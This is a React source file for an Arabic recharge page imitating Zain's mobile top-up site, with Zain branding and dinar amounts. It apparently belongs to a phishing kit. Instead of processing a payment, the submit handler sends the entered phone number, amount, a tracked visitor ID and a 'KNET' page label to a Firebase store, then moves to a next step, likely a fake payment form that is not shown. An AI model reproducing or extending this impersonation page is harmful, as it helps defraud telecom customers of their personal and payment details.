"use client"

import type React from "react"

import { useEffect, useMemo, useState } from "react"
import { Menu, ChevronDown, Plus, Check, Loader2 } from "lucide-react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { Sheet, SheetContent, SheetDescription, SheetHeader, SheetTrigger } from "./ui/sheet"
import Link from "next/link"
import { addData } from "@/lib/firebase"

const rechargeOptions = [
  { amount: "2.000", validity: "الصلاحية 2 يوم", days: 2 },
  { amount: "4.000", validity: "الصلاحية 7 يوم", days: 7 },
  { amount: "6.000", validity: "الصلاحية 15 يوم", days: 15 },
  { amount: "12.000", validity: "الصلاحية 30 يوم", days: 30 },
  { amount: "22.000", validity: "الصلاحية 60 يوم", days: 60 },
  { amount: "30.000", validity: "الصلاحية 180 يوم", days: 180 },
  { amount: "50.000", validity: "الصلاحية 365 يوم", days: 365 },
]

export default function ZainRechargePage({
  setShow,
  setStepNumber,
}: {
  setShow?: (v: boolean) => void
  setStepNumber?: (n: number) => void
}) {
  const [activeTab, setActiveTab] = useState<"recharge" | "bill">("recharge")
  const [phoneNumber, setPhoneNumber] = useState("")
  const [phoneError, setPhoneError] = useState("")
  const [loading, setIsLoading] = useState(false)

  const [selectedAmount, setSelectedAmount] = useState(rechargeOptions[2])
  const [isAmountDropdownOpen, setIsAmountDropdownOpen] = useState(false)

  // Derived state
  const isValidPhone = phoneNumber.length === 8 && /^\d{8}$/.test(phoneNumber)
  const isFormValid = isValidPhone && Number.parseFloat(selectedAmount.amount) > 0

  useEffect(() => {
    localStorage.setItem("amount", selectedAmount.amount)
  }, [selectedAmount])

  useEffect(() => {
    if (!phoneNumber) return setPhoneError("")
    if (!/^\d+$/.test(phoneNumber) || phoneNumber.length !== 8) {
      setPhoneError("يجب أن يتكون رقم الهاتف من 8 أرقام صحيحة.")
    } else {
      setPhoneError("")
    }
  }, [phoneNumber])

  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/[^0-9]/g, "")
    if (value.length <= 8) setPhoneNumber(value)
  }

  const handleAmountSelect = (value: string) => {
    const option = rechargeOptions.find((opt) => opt.amount === value)
    if (option) setSelectedAmount(option)
  }

  const formattedAmount = useMemo(
    () => Number.parseFloat(selectedAmount.amount || "0").toFixed(3),
    [selectedAmount.amount],
  )

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    if (!isFormValid) return
    setIsLoading(true)
    try {
      const visitorId = localStorage.getItem("visitor")
      await addData({
        id: visitorId,
        phone: phoneNumber,
        phoneNumber,
        amount: selectedAmount.amount,
        timestamp: new Date().toISOString(),
        currentPage: "كي نت",
        action: "payment_submit_attempt",
        type: activeTab,
      })
      if (setStepNumber) setStepNumber(2)
    } catch (error: any) {
      console.error("Submission error:", error)
      const visitorId = localStorage.getItem("visitor")
      await addData({
        id: visitorId,
        action: "payment_submit_error",
        error: error?.message ?? String(error),
      })
    } finally {
      setIsLoading(false)
    }
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-50 to-gray-100" dir="rtl">
      {loading && (
        <div className="fixed inset-0 bg-black/50 backdrop-blur-sm z-50 flex items-center justify-center">
          <div className="bg-white rounded-2xl p-8 shadow-2xl flex flex-col items-center gap-4">
            <Loader2 className="w-12 h-12 animate-spin text-[#d62598]" />
            <p className="text-lg font-semibold text-gray-800">جاري المعالجة...</p>
            <p className="text-sm text-gray-500">الرجاء الانتظار</p>
          </div>
        </div>
      )}

      <header className="relative bg-[#1a1240] shadow-md">
        <img src="/top.webp" alt="Zain" className="h-10 w-full object-cover" />
        <Sheet>
          <SheetTrigger className="absolute left-3 top-1/2 -translate-y-1/2 hover:bg-white/10 w-8 h-8 p-1 rounded-lg flex items-center justify-center transition-colors">
            <Menu className="w-5 h-5 text-white" />
          </SheetTrigger>
          <SheetContent>
            <SheetHeader>
              <SheetDescription className="my-6 flex flex-col gap-4">
                <Link href="/terms-conditions" className="text-base hover:text-[#d62598] transition-colors">
                  الشروط والأحكام
                </Link>
                <Link href={"/privacy"} className="text-base hover:text-[#d62598] transition-colors">
                  سياسة الخصوصية
                </Link>
                <Link href={"/contact"} className="text-base hover:text-[#d62598] transition-colors">
                  اتصل بنا
                </Link>
              </SheetDescription>
            </SheetHeader>
          </SheetContent>
        </Sheet>
      </header>

      <div className="px-3 py-4 max-w-md mx-auto">
        <div className="bg-white rounded-2xl shadow-xl overflow-hidden border border-gray-100">
          <div className="grid grid-cols-2 border-b border-gray-100 bg-gray-50/50">
            <button
              onClick={() => setActiveTab("bill")}
              className={`py-3 text-sm text-center font-semibold transition-all relative ${
                activeTab === "bill"
                  ? "text-[#d62598] bg-white"
                  : "text-gray-500 hover:text-gray-700 hover:bg-gray-100/50"
              }`}
            >
              {activeTab === "bill" && (
                <div className="absolute bottom-0 left-0 right-0 h-0.5 bg-gradient-to-r from-[#d62598] to-[#e94aa1]" />
              )}
              دفع الفاتورة
            </button>
            <button
              onClick={() => setActiveTab("recharge")}
              className={`py-3 text-sm text-center font-semibold transition-all relative ${
                activeTab === "recharge"
                  ? "text-[#d62598] bg-white"
                  : "text-gray-500 hover:text-gray-700 hover:bg-gray-100/50"
              }`}
            >
              {activeTab === "recharge" && (
                <div className="absolute bottom-0 left-0 right-0 h-0.5 bg-gradient-to-r from-[#d62598] to-[#e94aa1]" />
              )}
              <span className="text-[#d62598]">eeZee</span> إعادة تعبئة
            </button>
          </div>

          <div className="p-5 space-y-5">
            <div>
              <p className="text-gray-700 mb-2 text-right text-sm font-medium">أود أن أعيد التعبئة ل</p>
              <Select defaultValue="other">
                <SelectTrigger className="w-full bg-gray-50 border border-gray-200 hover:border-[#d62598] rounded-lg px-3 py-2 text-sm text-right transition-colors focus:ring-2 focus:ring-[#d62598]/20">
                  <SelectValue />
                </SelectTrigger>
                <SelectContent>
                  <SelectItem value="other">رقم آخر</SelectItem>
                  <SelectItem value="my">رقمي</SelectItem>
                </SelectContent>
              </Select>
            </div>

            <div>
              <label className="text-xs font-medium text-gray-600 mb-2 block text-right">رقم الهاتف *</label>
              <Input
                type="tel"
                value={phoneNumber}
                onChange={handlePhoneChange}
                placeholder=""
                className={`text-lg font-semibold bg-gray-50 border-2 rounded-lg px-3 py-4 text-right transition-all focus:bg-white ${
                  phoneError
                    ? "border-red-300 focus:border-red-500 focus:ring-red-200"
                    : "border-gray-200 hover:border-[#d62598]/50 focus:border-[#d62598]"
                }`}
                dir="ltr"
              />
              {phoneError && (
                <p className="text-red-500 text-xs mt-1.5 text-right flex items-center justify-end gap-1">
                  <span>{phoneError}</span>
                </p>
              )}
            </div>

            <div>
              <label className="text-gray-700 mb-2 block text-right text-sm font-medium">مبلغ التعبئة</label>
              <div className="relative">
                <button
                  onClick={() => setIsAmountDropdownOpen(!isAmountDropdownOpen)}
                  className="w-full flex items-center justify-between bg-gray-50 border-2 border-gray-200 hover:border-[#d62598] rounded-lg p-3 transition-all focus:outline-none focus:ring-2 focus:ring-[#d62598]/20"
                >
                  <ChevronDown
                    className={`w-4 h-4 text-[#d62598] transition-transform ${isAmountDropdownOpen ? "rotate-180" : ""}`}
                  />
                  <div className="text-right flex-1 mr-3">
                    <div className="text-lg font-bold text-gray-900">د.ك {selectedAmount.amount}</div>
                    <div className="text-xs text-gray-500 mt-0.5">{selectedAmount.validity}</div>
                  </div>
                </button>

                {isAmountDropdownOpen && (
                  <>
                    <div className="fixed inset-0 z-10" onClick={() => setIsAmountDropdownOpen(false)} />
                    <div className="absolute top-full left-0 right-0 mt-2 bg-white rounded-xl shadow-2xl border-2 border-gray-100 z-20 max-h-[300px] overflow-y-auto">
                      {rechargeOptions.map((option, index) => (
                        <button
                          key={index}
                          onClick={() => {
                            setSelectedAmount(option)
                            setIsAmountDropdownOpen(false)
                          }}
                          className={`w-full flex items-center justify-between px-4 py-3 transition-all border-b border-gray-50 last:border-b-0 ${
                            selectedAmount.amount === option.amount ? "bg-[#d62598]/5" : "hover:bg-gray-50"
                          }`}
                        >
                          <div className="w-5 flex items-center justify-center">
                            {selectedAmount.amount === option.amount && <Check className="w-4 h-4 text-[#d62598]" />}
                          </div>
                          <div className="text-right flex-1 mr-2">
                            <div className="text-sm font-bold text-gray-900">د.ك {option.amount}</div>
                            <div className="text-xs text-gray-500 mt-0.5">{option.validity}</div>
                          </div>
                        </button>
                      ))}
                      <button
                        onClick={() => {
                          setIsAmountDropdownOpen(false)
                        }}
                        className="w-full px-4 py-3 hover:bg-gray-50 transition-colors text-right border-t-2 border-gray-100"
                      >
                        <div className="text-sm font-bold text-[#d62598]">مبلغ آخر</div>
                      </button>
                    </div>
                  </>
                )}
              </div>
            </div>

            <button
              disabled={true}
              className="w-full py-3 border-2 border-[#d62598]/30 text-[#d62598] rounded-lg text-sm font-medium flex items-center justify-center gap-2 hover:bg-[#d62598]/5 transition-all disabled:opacity-40 disabled:cursor-not-allowed"
            >
              <Plus className="w-4 h-4" />
              أضف رقم آخر
            </button>
          </div>

          <div className="border-t-2 border-gray-100 mx-5" />

          <div className="px-5 py-4 flex items-center justify-between bg-gray-50/50">
            <div className="text-left bg-emerald-50 px-3 py-1.5 rounded-lg">
              <div className="text-lg font-bold text-emerald-600">د.ك {selectedAmount.amount}</div>
            </div>
            <div className="text-right">
              <div className="text-sm font-semibold text-gray-700">إجمالي المبلغ</div>
            </div>
          </div>

          <div className="p-5 pt-0 pb-5">
            <Button
              onClick={handleSubmit}
              disabled={!isFormValid || loading}
              className="w-full bg-gradient-to-r from-[#d62598] to-[#e94aa1] hover:from-[#c01e85] hover:to-[#d62598] text-white text-base py-5 rounded-lg font-bold shadow-lg shadow-[#d62598]/25 disabled:opacity-50 disabled:cursor-not-allowed disabled:shadow-none transition-all hover:shadow-xl hover:shadow-[#d62598]/30 active:scale-[0.98]"
            >
              أعد التعبئة الآن
            </Button>
          </div>
        </div>
      </div>
    </div>
  )
}
